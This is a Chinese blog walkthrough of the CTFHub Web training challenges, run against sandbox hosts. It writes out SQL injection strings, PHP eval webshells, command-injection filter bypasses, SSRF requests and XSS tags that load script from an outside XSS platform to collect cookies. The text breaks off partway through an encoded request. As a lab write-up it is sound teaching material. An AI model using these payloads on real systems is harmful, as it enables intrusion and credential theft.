---
layout: post
title: CTFHub Web
subtitle: CTFHub Web
date: 2025-07-02 17:13
author: Kyon-H
header-img: img/post-bg-2015.jpg
tags:
  - 靶场实战
  - CTF-HUB
published: false
---
## 一、信息泄露
### 目录遍历

手动查找目录，找到flag

### PHPINFO

查看phpinfo，搜索到flag

### 备份文件下载

#### 网站源码

![](https://cdn.nlark.com/yuque/0/2025/webp/57535506/1751463887409-d80dfd73-aec4-41f2-850b-c37754618d7e.webp)

bp构造payload，获取到`www.zip`文件，解压

![](https://cdn.nlark.com/yuque/0/2025/png/57535506/1751465395126-caa7b2f2-4121-4981-b7eb-65deb31ff48f.png)

文件中未找到，访问`flag_183531374.txt`获取到flag

#### bak文件

![](https://cdn.nlark.com/yuque/0/2025/webp/57535506/1751464037336-2994194f-3852-46ca-8cd0-569efad60af4.webp)

访问`index.php.bak`文件获取到flag

![](https://cdn.nlark.com/yuque/0/2025/png/57535506/1751465497401-5415af87-34a5-4890-a526-1f8857476946.png)

#### vim缓存
访问`.index.php.swp`文件，找到flag

![](https://cdn.nlark.com/yuque/0/2025/png/57535506/1751465539297-d84d685a-30df-4d96-bb2b-8807c6781645.png)

#### .DS_Store
访问`.DS_Store`文件，010editer打开文件

![](https://cdn.nlark.com/yuque/0/2025/png/57535506/1751465594949-566e641c-981d-442c-abb8-ad39c03dffd3.png)

发现`$10010cb6de4616ede8b328b9d2554a28.txt`尝试访问，`10010cb6de4616ede8b328b9d2554a28.txt`成功获取flag

### git泄露
#### Log
安装python2、githack、git

```powershell
C:\Python27\python.exe GitHack.py http://challenge-5cb803c5533f39b4.sandbox.ctfhub.com:10800/.git/
```

`git log`查看log

![](https://cdn.nlark.com/yuque/0/2025/png/57535506/1751523892795-f8c42f79-82e2-4007-a08a-60699dc9cfbb.png)

发现`add flag`，回退上一版本

```powershell
git reset --hard HEAD^
git reset --hard HEAD~1
```

![](https://cdn.nlark.com/yuque/0/2025/png/57535506/1751524591972-d600143a-875e-4a6f-a4b7-922d7bacf1c0.png)

查看txt文件

![](https://cdn.nlark.com/yuque/0/2025/png/57535506/1751524606929-52272e92-f9f8-402a-a9e2-0731f7a8bfca.png)

#### Stash
```powershell
C:\Python27\python.exe GitHack.py http://challenge-ca3ba3c6234445cf.sandbox.ctfhub.com:10800/.git/
```

`git stash show`

![](https://cdn.nlark.com/yuque/0/2025/png/57535506/1751524904004-c8356782-0eb8-4f8e-b449-f3823b7ca5c4.png)

`git stash pop`查看文件

![](https://cdn.nlark.com/yuque/0/2025/png/57535506/1751524983598-b2564bb4-2e1d-4afa-80e0-dee849e4582a.png)

#### Index
```html
python GitHack.py http://challenge-2a69d53086d643a3.sandbox.ctfhub.com:10800/.git/
```

查看index文件

![](https://cdn.nlark.com/yuque/0/2025/png/57535506/1751614871262-c3ccd0fe-17a3-4e37-ae23-642dc5bdc922.png)

查看`1588776130569.txt`

![](https://cdn.nlark.com/yuque/0/2025/png/57535506/1751614905943-56234417-5752-4780-8d81-80dbd37c4f4b.png)

### SVN泄露
![](https://cdn.nlark.com/yuque/0/2025/png/57535506/1751615221109-ab28aa7c-802f-44d0-8490-4a5fa4edbfc4.png)

linux系统上安装dvcs-ripper

```shell
./rip-svn.pl -u http://challenge-6063e4511270c110.sandbox.ctfhub.com:10800/.svn/
la
cd .svn
cat wc.db | grep -a ctfhub
cd pristine/
la
cat 75/7522b3c99b02d3df183cc256ce3629ab8c37f958.svn-base
```

![](https://cdn.nlark.com/yuque/0/2025/png/57535506/1751681686843-fad6cc1d-5bc3-434d-b14d-82a9d0f4eddb.png)

### HG泄露
![](https://cdn.nlark.com/yuque/0/2025/png/57535506/1751681721995-02bfed44-a9de-42e1-a2e7-ee53eb7d27b1.png)

```shell
./rip-hg.pl -u http://challenge-f9d41b1415c932d8.sandbox.ctfhub.com:10800/.hg/
tree .hg
```

![](https://cdn.nlark.com/yuque/0/2025/png/57535506/1751682209162-dfafc757-1003-4b50-b011-f2f6049dcf76.png)

![](https://cdn.nlark.com/yuque/0/2025/png/57535506/1751682498458-2a8cb2ff-f7d2-4197-87ed-f33c87c81b00.png)

查找到`flag_2968918689.txt`

访问`[http://challenge-f9d41b1415c932d8.sandbox.ctfhub.com:10800/flag_2968918689.txt](http://challenge-f9d41b1415c932d8.sandbox.ctfhub.com:10800/flag_2968918689.txt)`

![](https://cdn.nlark.com/yuque/0/2025/png/57535506/1751682537399-67fd7715-3c1f-4d05-a1c7-78b2d412ce0c.png)

## 二、密码口令
### 弱口令
bp

![](https://cdn.nlark.com/yuque/0/2025/png/57535506/1751536173369-aaf2392e-e3ef-47c7-93fb-ba12ddadc3ce.png)

![](https://cdn.nlark.com/yuque/0/2025/png/57535506/1751536187804-768958dd-313a-4088-9417-d4d7e4847f5b.png)

### 默认口令
使用admin用户登录，显示用户不存在，尝试测试用户名，失败

浏览器搜索eYou默认账户名密码进行尝试

```sql
 eyougw:admin@(eyou)
```

![](https://cdn.nlark.com/yuque/0/2025/png/57535506/1751545510902-ca8e6adf-aa3c-40ae-8c1e-4d5a5a60e9ac.png)

## 三、SQL注入
### 整数型注入
```sql
1 #显示
1 and 1=1 #显示
-1 union select 1,2,3 #不显示
-1 union select 1,2 #显示
```

![](https://cdn.nlark.com/yuque/0/2025/png/57535506/1751546610118-a931a08d-7486-4e73-bf94-3b38b6f59bea.png)

获取数据库和表

![](https://cdn.nlark.com/yuque/0/2025/png/57535506/1751546698517-fcf93246-9a53-4f65-8812-945916eb0f2e.png)

获取`flag`表字段

![](https://cdn.nlark.com/yuque/0/2025/png/57535506/1751546778809-4c238131-a3bd-4b62-8c3d-1efecbc335a8.png)

获取flag

![](https://cdn.nlark.com/yuque/0/2025/png/57535506/1751546839196-e0b5e579-c8ff-416d-a5cf-bc0861b15282.png)

### 字符型注入
```xml
# 字符型确认
?id=1' and 1=1--+
?id=1' and 1=-1--+
```

![](https://cdn.nlark.com/yuque/0/2025/png/57535506/1751552228298-cc46f7b1-f4fa-444c-a896-ba22c6a2451f.png)

![](https://cdn.nlark.com/yuque/0/2025/png/57535506/1751552346688-3dd08c0c-0482-42f3-8965-1aedeb589266.png)

![](https://cdn.nlark.com/yuque/0/2025/png/57535506/1751552424911-bc13562f-965a-47c2-9731-0b17583464d9.png)

![](https://cdn.nlark.com/yuque/0/2025/png/57535506/1751552592086-1a781cae-f532-4dbf-8c44-e3b6d7c62cdd.png)

### 报错注入
![](https://cdn.nlark.com/yuque/0/2025/png/57535506/1751553015569-135ff899-b184-4da0-89d2-f9b1c3f0f054.png)

![](https://cdn.nlark.com/yuque/0/2025/png/57535506/1751553082896-685adb6d-70d9-41e8-9c27-e1915e0e5423.png)

![](https://cdn.nlark.com/yuque/0/2025/png/57535506/1751553134725-133ca9f8-f743-431a-bb96-7eb753d5f199.png)

![](https://cdn.nlark.com/yuque/0/2025/png/57535506/1751553247045-a8d6381a-83af-4151-8a25-b67463d164d1.png)

![](https://cdn.nlark.com/yuque/0/2025/png/57535506/1751553260899-ec4411c7-2b4a-40bf-93f3-7261895237da.png)

### 布尔盲注
经测试只有`query_error``query_success `两种

布尔盲注

```sql
1 and (select count(table_name) from information_schema.tables where table_schema=database())=2 -- 表数量2
1 and length((select table_name from information_schema.tables where table_schema=database() limit 0,1))=4 -- 表1长度4
1 and length((select table_name from information_schema.tables where table_schema=database() limit 1,1))=4 -- 表2长度4
```

```sql
1 and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 1,1),1,1))=100 -- 
```

![](https://cdn.nlark.com/yuque/0/2025/png/57535506/1751554790937-f9e129e7-9510-48a2-a648-48c1201fcc7d.png)

表名：flag

```sql
1 and (select count(column_name) from information_schema.columns where table_schema=database() and table_name='flag')=1 -- 列数1
1 and length((select column_name from information_schema.columns where table_schema=database() and table_name='flag' limit 0,1))=4 -- 列长度4
```

```sql
1 and ascii(substr((select column_name from information_schema.columns where table_schema=database() and table_name='flag' limit 0,1),1,1))=100 -- 
```

![](https://cdn.nlark.com/yuque/0/2025/png/57535506/1751555455225-ffa75ad0-6a60-46ff-abe5-f8f785eec9c7.png)

列名：flag

```sql
1 and length((select flag from flag limit 0,1))=32 -- 
```

```sql
1 and ascii(substr((select flag from flag limit 0,1),1,1))=100 -- 
```

![](https://cdn.nlark.com/yuque/0/2025/png/57535506/1751556017005-d3daa211-19be-4b3b-b201-4b1130deb274.png)

`<font style="color:rgb(139, 139, 139);">ctfhub{f127288b7d5f415118ee54ed}</font>`

### 时间盲注
```plsql
1 and sleep(3) -- 数字型注入
1 and if((select count(table_name)from information_schema.tables where table_schema=database())=2,sleep(3),0) -- 表数量2
1 and if(length((select table_name from information_schema.tables where table_schema=database() limit 0,1))=4,sleep(2),0) -- 表1长度4
1 and if(length((select table_name from information_schema.tables where table_schema=database() limit 1,1))=4,sleep(2),0) -- 表2长度4
1 and if(ascii(substr((select table_name from information_schema.tables where ta
ble_schema=database() limit 1,1),§1§,1))=§100§,sleep(2),0) -- 表1：news;表2：flag
1 and if((select count(column_name) from information_schema.columns where table_schema=database() and table_name='flag')=1,sleep(2),0) -- flag表列数量1
1 and if(length((select column_name from information_schema.columns where table_schema=database() and table_name='flag'))=4,sleep(2),0) -- 列1长度4
1 and if(ascii(substr((select column_name from information_schema.columns where 
table_schema=database() and table_name='flag'),§1§,1))=§100§,sleep(2),0) -- 列1名flag
```

```plsql
1 and if(ascii(substr((select flag from flag),§1§,1))=§100§,sleep(2),0)
```

![](https://cdn.nlark.com/yuque/0/2025/png/57535506/1751617832429-f6fc2ba4-0862-4ffa-8ca6-3509bf9090fb.png)

`<font style="color:rgb(139, 139, 139);">ctfhub{77f14ac024782fa5cb10968e}</font>`

### MySQL结构
```plsql
1 union select 1,2
1 union select 1,2,3
```

![](https://cdn.nlark.com/yuque/0/2025/png/57535506/1751618691868-356ac935-0ba3-407f-ae5f-8f23fff0f071.png)

确定查询两列

![](https://cdn.nlark.com/yuque/0/2025/png/57535506/1751618744731-15b59518-137d-4a15-a42c-3515e2309ba6.png)

![](https://cdn.nlark.com/yuque/0/2025/png/57535506/1751618839597-91c268e9-e63b-4ff8-83ed-b42179cbae97.png)

![](https://cdn.nlark.com/yuque/0/2025/png/57535506/1751618888507-80c54702-a251-4993-8a59-ae6688ef7989.png)

### Cookie注入
![](https://cdn.nlark.com/yuque/0/2025/png/57535506/1751679255230-88e50041-73b6-4ac4-b3ec-6012e580247b.png)

![](https://cdn.nlark.com/yuque/0/2025/png/57535506/1751679236812-9822d285-9ab4-406b-8519-4bbe81e3d4b2.png)

![](https://cdn.nlark.com/yuque/0/2025/png/57535506/1751679305528-8ccc4287-51a9-4fad-9f27-5edf88b03982.png)

![](https://cdn.nlark.com/yuque/0/2025/png/57535506/1751679344413-0bda9005-f9af-4407-a5a3-069c4428a85c.png)

![](https://cdn.nlark.com/yuque/0/2025/png/57535506/1751679399678-eccef318-7cd1-40da-a66e-4010a22887f6.png)

### UA注入
![](https://cdn.nlark.com/yuque/0/2025/png/57535506/1751679538900-002d28af-bd00-4e25-bc84-067873fda05f.png)

![](https://cdn.nlark.com/yuque/0/2025/png/57535506/1751679542195-9e491330-b54c-4aa5-865a-63e7657ba236.png)

![](https://cdn.nlark.com/yuque/0/2025/png/57535506/1751679579381-aaa50ae1-b053-4c6d-9817-afe2bc600098.png)

![](https://cdn.nlark.com/yuque/0/2025/png/57535506/1751679615804-8f0fb4a1-9e6b-4316-8b37-56adaa4466b6.png)

![](https://cdn.nlark.com/yuque/0/2025/png/57535506/1751679650820-ee3aad8c-cc6d-4dd0-bf4c-908fde946a68.png)

### Refer注入
原请求无refer，手动添加

![](https://cdn.nlark.com/yuque/0/2025/png/57535506/1751680050652-9848dd9c-fef1-44d3-89f4-3377a792d49f.png)

![](https://cdn.nlark.com/yuque/0/2025/png/57535506/1751680058815-10fb3eea-1d00-4ab6-8625-23ea7817ef68.png)

![](https://cdn.nlark.com/yuque/0/2025/png/57535506/1751680084764-6388ce74-e3f9-469a-999b-58ed805900e0.png)

![](https://cdn.nlark.com/yuque/0/2025/png/57535506/1751680110445-7c0a89a2-baf5-49d5-bd25-93826aead17d.png)

![](https://cdn.nlark.com/yuque/0/2025/png/57535506/1751680172613-e03b1676-add7-4837-b97a-6b156f002587.png)

![](https://cdn.nlark.com/yuque/0/2025/png/57535506/1751680203421-25118184-bcce-4a6c-9b76-7aed3d29d1a5.png)

### 过滤空格
`-1 union select 1,2`

![](https://cdn.nlark.com/yuque/0/2025/png/57535506/1751680440269-694e1e62-0cf7-4410-873b-1b4a7ba2d243.png)

`-1/**/union/**/select/**/1,2`

![](https://cdn.nlark.com/yuque/0/2025/png/57535506/1751680506910-cfb2f8da-27c8-48d2-b4f9-0eea6cf0dfbb.png)

```sql
-1/**/union/**/select/**/database(),group_concat(table_name)from/**/information_schema.tables/**/where/**/table_schema=database()
```

![](https://cdn.nlark.com/yuque/0/2025/png/57535506/1751680599504-882c90f9-3ed1-4007-b941-2d681f9d3f09.png)

```sql
-1/**/union/**/select/**/database(),group_concat(column_name)from/**/information_schema.columns/**/where/**/table_schema=database()/**/and/**/table_name='iwnukmmbul'
```

![](https://cdn.nlark.com/yuque/0/2025/png/57535506/1751680833619-c8413cab-a7d9-43b6-b4e2-c9c0e66b26b0.png)

```sql
-1/**/union/**/select/**/database(),group_concat(pvrmhtxmxm)from/**/iwnukmmbul
```

![](https://cdn.nlark.com/yuque/0/2025/png/57535506/1751680872562-0c4cee6e-7e3d-452c-858b-52f3fa03f576.png)

## 四、XSS
### 反射型
![](https://cdn.nlark.com/yuque/0/2025/png/57535506/1751620172215-c85ca67d-860c-4c68-bff7-a5ddab9491ba.png)

```html
<script>alert(123)</script> #成功
```

注册XSS平台，填入`<sCRiPt sRC=//xs.pe/s2x></sCrIpT>`复制地址栏地址sendURLtoBot

查看访问记录的cookie

![](https://cdn.nlark.com/yuque/0/2025/png/57535506/1751620396317-c796bef5-6a30-490d-9a95-083e5a89fb3c.png)

### 存储型
```html
<script>alert(123)</script> #成功
<sCRiPt sRC=//xs.pe/s2x></sCrIpT>
```

![](https://cdn.nlark.com/yuque/0/2025/png/57535506/1751620704468-2287fa90-9d56-486d-97c8-69f3c8da60c8.png)

### DOM反射
```html
<script>alert(123)</script> #失败，发现是与原始script闭合导致
```

![](https://cdn.nlark.com/yuque/0/2025/png/57535506/1751621490139-6fdd6dac-378c-4405-b7bb-fdcd58824144.png)![](https://cdn.nlark.com/yuque/0/2025/png/57535506/1751621533045-ab06f9b7-f6be-43eb-9a50-a9fc881fdbcc.png)

```html
#补全，成功
</script><script>alert(123)</script>
</script><sCRiPt sRC=//xs.pe/s2x></sCrIpT>
```

![](https://cdn.nlark.com/yuque/0/2025/png/57535506/1751621678036-2e829e1a-3fc9-4faa-a07f-301b73d5cb5f.png)

### DOM跳转
查看页面代码，可知需要构造`?jumpto=xxx`

![](https://cdn.nlark.com/yuque/0/2025/png/57535506/1751621913608-a52e051c-37d4-4a62-ba54-b025bc5d05a3.png)

```html
http://challenge-e727a1e5d8b21242.sandbox.ctfhub.com:10800/?jumpto=javascript:alert(123)
```

成功



### 过滤空格
```html
<sCRiPt sRC=//xs.pe/s2x></sCrIpT>
```

![](https://cdn.nlark.com/yuque/0/2025/png/57535506/1751638490776-376b45cd-0509-4894-b623-fd32f6c4f82d.png)

```html
<sCRiPt/SrC=//xs.pe/s2x> #成功
```

![](https://cdn.nlark.com/yuque/0/2025/png/57535506/1751638653686-f988a8f3-8d8e-4c4c-a9ed-47d7299747b8.png)

### 过滤关键词
测试过滤`script``img``onerror`

![](https://cdn.nlark.com/yuque/0/2025/png/57535506/1751638837030-b3afb61c-bb4c-4290-aa6b-b1918df77366.png)

大写绕过

```html
<sCRiPt sRC=//xs.pe/s2x></sCrIpT>
```

![](https://cdn.nlark.com/yuque/0/2025/png/57535506/1751771673689-e7e96a51-dba7-4f55-8a58-b2d56d59ada7.png)

## 五、文件上传
### 无验证
构造一句话木马`shell.php`

```php
<?php echo 123;@eval($_POST['code']);?>
```

上传成功

![](https://cdn.nlark.com/yuque/0/2025/png/57535506/1751683007585-c56c219f-d6ed-41cf-8049-3dd76d2b0230.png)

![](https://cdn.nlark.com/yuque/0/2025/png/57535506/1751683027797-56c5b548-5d86-4548-97cf-400fbd1b29ab.png)

蚁剑获取到flag文件

![](https://cdn.nlark.com/yuque/0/2025/png/57535506/1751683103706-76cdb95f-0c6c-4613-b158-e8d5264f48f7.png)

### 前端验证
上传`shell.php.jpg`bp抓包修改后缀，上传成功，蚁剑连接

![](https://cdn.nlark.com/yuque/0/2025/png/57535506/1751683345122-ea040dd8-eb4e-4132-acbd-3ab843666910.png)

### .htaccess
创建`.htaccess`文件上传

```php
<FilesMatch "wshell">
Sethandler application/x-httpd-php
</FilesMatch>
```

上传`shell.gif`木马

代码成功执行

![](https://cdn.nlark.com/yuque/0/2025/png/57535506/1751683750525-897fcb8c-b4f6-4425-ad22-ebf5ac9a929a.png)

![](https://cdn.nlark.com/yuque/0/2025/png/57535506/1751683803867-9f0206aa-cd20-4c7b-b2d8-89be049c9bb4.png)

### MIME绕过
上传`shell.php.jpg`bp抓包修改后缀，上传成功，蚁剑连接

![](https://cdn.nlark.com/yuque/0/2025/png/57535506/1751683967035-cbc3d00a-f84a-4cef-a700-2f375d825327.png)

### 00截断
检查发现代码，文件路径由get提交的`road`和随机数、时间、后缀组成

```php
if (!empty($_POST['submit'])) {
    $name = basename($_FILES['file']['name']);
    $info = pathinfo($name);
    $ext = $info['extension'];
    $whitelist = array("jpg", "png", "gif");
    if (in_array($ext, $whitelist)) {
        $des = $_GET['road'] . "/" . rand(10, 99) . date("YmdHis") . "." . $ext;
        if (move_uploaded_file($_FILES['file']['tmp_name'], $des)) {
            echo "<script>alert('上传成功')</script>";
        } else {
            echo "<script>alert('上传失败')</script>";
        }
    } else {
        echo "文件类型不匹配";
    }
}
```

`%00`截断road参数，上传成功

![](https://cdn.nlark.com/yuque/0/2025/png/57535506/1751686369500-7fa68253-97ae-4059-bd3c-629e57d6f2da.png)

![](https://cdn.nlark.com/yuque/0/2025/png/57535506/1751686389148-b5d65dd2-8e1e-4925-86f2-2f13b4a1d72e.png)

![](https://cdn.nlark.com/yuque/0/2025/png/57535506/1751686435602-759866e5-3622-481b-957d-03890a9ccc98.png)

### 双写后缀
代码发现字符替换函数，双写绕过

```php
$name = basename($_FILES['file']['name']);
$blacklist = array("php", "php5", "php4", "php3", "phtml", "pht", "jsp", "jspa", "jspx", "jsw", "jsv", "jspf", "jtml", "asp", "aspx", "asa", "asax", "ascx", "ashx", "asmx", "cer", "swf", "htaccess", "ini");
$name = str_ireplace($blacklist, "", $name);
```

上传`shell.pphphp`成功，蚁剑

![](https://cdn.nlark.com/yuque/0/2025/png/57535506/1751686780589-72ce9c8b-d684-4972-ba85-8790cbd87bbf.png)

### 文件头检查
上传`shell.php.gif`bp抓包修改后缀，

```php
GIF89a
<?php echo 123;@eval($_POST['code']);?>
```

上传成功，蚁剑连接

![](https://cdn.nlark.com/yuque/0/2025/png/57535506/1751684145018-f5cd7ba1-1262-4f9c-a884-a06744f17024.png)

## 六、RCE
### eval执行
![](https://cdn.nlark.com/yuque/0/2025/png/57535506/1751686995894-d1b2cbc7-4e80-4ac9-9f4e-08454403be00.png)

传入cmd参数

```php
system("ls -lR / | grep flag");
```

![](https://cdn.nlark.com/yuque/0/2025/png/57535506/1751687578802-93f6e4e9-26a0-4cb5-b7db-398d616010f4.png)

```php
system("find / -name flag_14104");
```

![](https://cdn.nlark.com/yuque/0/2025/png/57535506/1751687657486-f677e66e-04f3-4bb2-bf72-93a239480b95.png)

```php
system("cat /flag_14104");
```

`ctfhub{d3eaaa2187eddb495ba02f6e}`

### 文件包含
![](https://cdn.nlark.com/yuque/0/2025/png/57535506/1751687829586-f7d8ca26-eb4d-4116-ba1a-d6249c567730.png)

分析代码，GET传file参数不能有“flag”字符，自带shell.txt文件

```php
http://challenge-78e9fffaec2d5817.sandbox.ctfhub.com:10800/?file=shell.txt
```

蚁剑连接

![](https://cdn.nlark.com/yuque/0/2025/png/57535506/1751688055014-03d252d6-ddc3-4dac-a4dd-19f4ae015fda.png)

### php://input
![](https://cdn.nlark.com/yuque/0/2025/png/57535506/1751695276224-55fc3eaa-bfad-4c47-918b-7ae5eedb9ba2.png)

![](https://cdn.nlark.com/yuque/0/2025/png/57535506/1751695380746-f388acc1-839a-43b4-9fa7-469f3e1f3aae.png)

成功

```php
a=<?php system("ls /");?>
a=<?php system("cat /flag_21991");?>
```

![](https://cdn.nlark.com/yuque/0/2025/png/57535506/1751695604104-c6f430e8-ddaf-4593-839e-fbc214afb57d.png)

### 远程包含
![](https://cdn.nlark.com/yuque/0/2025/png/57535506/1751695665673-3cb0f377-4fc6-47a5-90af-94d8f0536612.png)

```php
http://challenge-057c54b0b096a464.sandbox.ctfhub.com:10800/?file=data://,<?php fputs(fopen('shell.php','w'),'123<?php eval($_POST["code"]);?>');
```

成功

![](https://cdn.nlark.com/yuque/0/2025/png/57535506/1751696589818-2cc35688-027b-430b-9728-3ae529b018a0.png)

### 读取源代码
![](https://cdn.nlark.com/yuque/0/2025/png/57535506/1751696636248-6b50eabe-5c1a-43fb-9cb8-0a51e942694c.png)

分析：file参数以`php://`开头，存在`/flag`文件

```php
http://challenge-a8afd380d641eed1.sandbox.ctfhub.com:10800/?file=php://filter/resource=/flag
```

![](https://cdn.nlark.com/yuque/0/2025/png/57535506/1751696771073-a60274bd-2bdf-4208-baf0-81a5d04ec610.png)

### 命令注入
```php
127.0.0.1|ls
```

![](https://cdn.nlark.com/yuque/0/2025/png/57535506/1751696898210-5ae8f781-a5a3-4d38-9eef-c05df9bb42c5.png)

```php
127.0.0.1|cat 262363244510708.php
```

![](https://cdn.nlark.com/yuque/0/2025/png/57535506/1751696975729-654a3a80-89b1-4127-bb68-f874c89639ad.png)

### 过滤cat
`127.0.0.1|ls`

![](https://cdn.nlark.com/yuque/0/2025/png/57535506/1751697050685-212bf344-e6ae-4ddd-87fe-63c5bf7ba978.png)

`127.0.0.1|head flag_42519488108.php`

![](https://cdn.nlark.com/yuque/0/2025/png/57535506/1751697123563-54e2e290-822f-4ed3-9e97-55162bdae02b.png)

### 过滤空格
`127.0.0.1|ls`

![](https://cdn.nlark.com/yuque/0/2025/png/57535506/1751697218065-db6a77aa-27c6-43d4-bd29-afde171de01e.png)

```php
http://challenge-66d5d23f43cc02ba.sandbox.ctfhub.com:10800/?ip=127.0.0.1;cat<flag_35921562431926.php
```

![](https://cdn.nlark.com/yuque/0/2025/png/57535506/1751697774795-62798081-58c7-42ed-946f-0504328111ae.png)

### 过滤目录分隔符
![](https://cdn.nlark.com/yuque/0/2025/png/57535506/1751697844791-c1a2fbc9-7892-48ab-bb14-060e923d10bd.png)

`127.0.0.1|cat flag_is_here`无内容，`ls -l`分析是目录

![](https://cdn.nlark.com/yuque/0/2025/png/57535506/1751698094416-62a403be-cf7e-4144-ab5f-0120ab95a940.png)

查看目录

![](https://cdn.nlark.com/yuque/0/2025/png/57535506/1751698154019-cc573664-ea1c-4262-ae1b-6d535145d96a.png)

```php
http://challenge-ccfac5e714299f03.sandbox.ctfhub.com:10800/?ip=127.0.0.1;cd flag_is_here;cat flag_27471845213010.php
```

![](https://cdn.nlark.com/yuque/0/2025/png/57535506/1751698246701-c92ece9c-e533-46c9-bb0e-b7f2d23a06ea.png)

### 过滤运算符
![](https://cdn.nlark.com/yuque/0/2025/png/57535506/1751698443422-d4a46158-8789-43c1-becc-637b0947fe9b.png)

只过滤了`|`、`&`未过滤`;`

`127.0.0.1|ls`

![](https://cdn.nlark.com/yuque/0/2025/png/57535506/1751698519398-f3a55fb2-09cd-4332-a760-293cbfa9bdda.png)

`127.0.0.1;cat flag_69852691721920.php`

![](https://cdn.nlark.com/yuque/0/2025/png/57535506/1751698591654-4a81246d-3552-4295-b5b0-c51dac9493df.png)

### 综合过滤练习
![](https://cdn.nlark.com/yuque/0/2025/png/57535506/1751698625612-4e3ea166-1c2d-41b3-989e-0aa8d6ac6555.png)

过滤了`|`、`&`、`;`、` `、`/`、`cat`、`flag`、`ctfhub`

```php
127.0.0.1%0als
```

![](https://cdn.nlark.com/yuque/0/2025/png/57535506/1751699053468-7ce63c66-a55b-4b3f-9b02-004626dfff2e.png)

```php
127.0.0.1%0als${IFS}-R #${IFS}代替空格ls -R
```

![](https://cdn.nlark.com/yuque/0/2025/png/57535506/1751700012016-4e32baaf-27ea-4625-a87f-62d25ef13749.png)

```php
127.0.0.1%0amv${IFS}fla*${IFS}fff%0als${IFS}-R #将文件夹flag改名为fff
```

![](https://cdn.nlark.com/yuque/0/2025/png/57535506/1751700369322-2a9eb196-7b52-4362-974a-78dd1da784e4.png)

![](https://cdn.nlark.com/yuque/0/2025/png/57535506/1751700794457-0dedf781-ed24-42ed-afad-9347394211ed.png)

flag文件无权限改名

```php
127.0.0.1%0acd${IFS}fff%0agrep${IFS}"ctf"${IFS}*.php #使用grep搜索*.php文件避开关键字
```

![](https://cdn.nlark.com/yuque/0/2025/png/57535506/1751701153149-7b9df7f7-1cb4-4d85-9f71-7c6adde6ec77.png)

## 七、SSRF
### 内网访问
访问`[http://127.0.0.1/flag.php](http://127.0.0.1/flag.php)`

### 伪协议读取文件
```html
http://127.0.0.1/flag.php
```

读取到？？？说明文件存在

```html
php://filter/read=convert.base64-encode/resource=http://127.0.0.1/flag.php
#都失败，尝试file 以绝对路径读取
file:///var/www/html/flag.php
# 成功读取
```

### 端口扫描
```html
dict://127.0.0.1:8080
```

bp抓包设置payload

![](https://cdn.nlark.com/yuque/0/2025/png/57535506/1751701819620-2cb2fa6c-076b-4102-8eb1-b1205750c35b.png)

8586有报错响应

![](https://cdn.nlark.com/yuque/0/2025/png/57535506/1751701858196-ba0dc635-69ce-4607-9b82-3dc3bc721639.png)

![](https://cdn.nlark.com/yuque/0/2025/png/57535506/1751701869843-362bdad8-1740-4855-9f83-b63ef07482a1.png)

### POST请求
`http://127.0.0.1/flag.php`

![](https://cdn.nlark.com/yuque/0/2025/png/57535506/1751706890582-1f43faac-704a-48f2-ab18-7860dbc12f83.png)

填入key提交

![](https://cdn.nlark.com/yuque/0/2025/png/57535506/1751706920954-97313d81-dd88-4251-805a-864d30795954.png)

URL二次编码，第一次URL编码后将`%0A`替换为`%0D0A`

```html
POST%2520%252Fflag.php%2520HTTP%252F1.1%250D%250AHost%253A%2520challenge-a4e82c2602cbeef6.sandbox.ctfhub.com%253A10800%250D%250AUser-Agent%253A%2520Mozilla%252F5.0%2520(Windows%2520NT%252010.0%253B%2520Win64%253B%2520x64%253B%2520rv%253A140.0)%2520Gecko%252F20100101%2520Firefox%252F140.0%250D%250AAccept%253A%2520text%252Fhtml%252Capplication%252Fxhtml%252Bxml%252Capplication%252Fxml%253Bq%253D0.9%252C*%252F*%253Bq%253D0.8%250D%250AAccept-Language%253A%2520zh-CN%252Czh%253Bq%253D0.8%252Czh-TW%253Bq%253D0.7%252Czh-HK%253Bq%253D0.5%252Cen-US%253Bq%253D0.3%252Cen%253Bq%253D0.2%250D%250AAccept-Encoding%253A%2520gzip%252C%2520deflate%250D%250AContent-Type%253A%2520application%252Fx-www-form-urlencoded%250D%250AContent-Length%253A%252036%250D%250AOrigin%253A%2520http%253A%252F%252Fchallenge-a4e82c2602cbeef6.sandbox.ctfhub.com%253A10800%250D%250AConnection%253A%2520close%250D%250AReferer%253A%2520http%253A%252F%252Fchallenge-a4e82c2602cbeef6.sandbox.ctfhub.com%253A10800%252F%253Furl%253D127.0.0.1%252Fflag.php%250D%250AUpgrade-Insecure-Requests%253A%25201%250D%250APriority%253A%2520u%253D0%252C%2520i%250D%250A%250D%250Akey%253Df16bc01bbf8a2ebfca9d9f7a01b7947e
```

![](https://cdn.nlark.com/yuque/0/2025/png/57535506/1751707117321-11c20e2a-62de-48ae-87a3-d60aef5a097e.png)

![](https://cdn.nlark.com/yuque/0/2025/png/57535506/1751707131665-e66d8467-ab49-4c5d-9457-b70d76eb5e56.png)

### 上传文件
![](https://cdn.nlark.com/yuque/0/2025/png/57535506/1751705985787-5863dc0c-a41c-4403-93a1-9520c83a4cf9.png)

添加submit，提交bp抓包

![](https://cdn.nlark.com/yuque/0/2025/png/57535506/1751706042862-a81ae379-56ed-4cb0-9694-b0e17172e714.png)

![](https://cdn.nlark.com/yuque/0/2025/png/57535506/1751706410675-cf30f480-8384-4825-8b49-95581a20c0c7.png)

第一次URL编码，并将`%0A`替换为`%0D0A`

```html
POST%20%2Fflag.php%20HTTP%2F1.1%0D%0AHost%3A%20challenge-b9fff0bf1f4b1a36.sandbox.ctfhub.com%3A10800%0D%0AUser-Agent%3A%20Mozilla%2F5.0%20(Windows%20NT%2010.0%3B%20Win64%3B%20x64%3B%20rv%3A140.0)%20Gecko%2F20100101%20Firefox%2F140.0%0D%0AAccept%3A%20text%2Fhtml%2Capplication%2Fxhtml%2Bxml%2Capplication%2Fxml%3Bq%3D0.9%2C*%2F*%3Bq%3D0.8%0D%0AAccept-Language%3A%20zh-CN%2Czh%3Bq%3D0.8%2Czh-TW%3Bq%3D0.7%2Czh-HK%3Bq%3D0.5%2Cen-US%3Bq%3D0.3%2Cen%3Bq%3D0.2%0D%0AAccept-Encoding%3A%20gzip%2C%20deflate%0D%0AContent-Type%3A%20multipart%2Fform-data%3B%20boundary%3D----geckoformboundary51834e26d074966e704b418761d460d1%0D%0AContent-Length%3A%20266%0D%0AOrigin%3A%20http%3A%2F%2Fchallenge-b9fff0bf1f4b1a36.sandbox.ctfhub.com%3A10800%0D%0AConnection%3A%20close%0D%0AReferer%3A%20http%3A%2F%2Fchallenge-b9fff0bf1f4b1a36.sandbox.ctfhub.com%3A10800%2F%3Furl%3D127.0.0.1%2Fflag.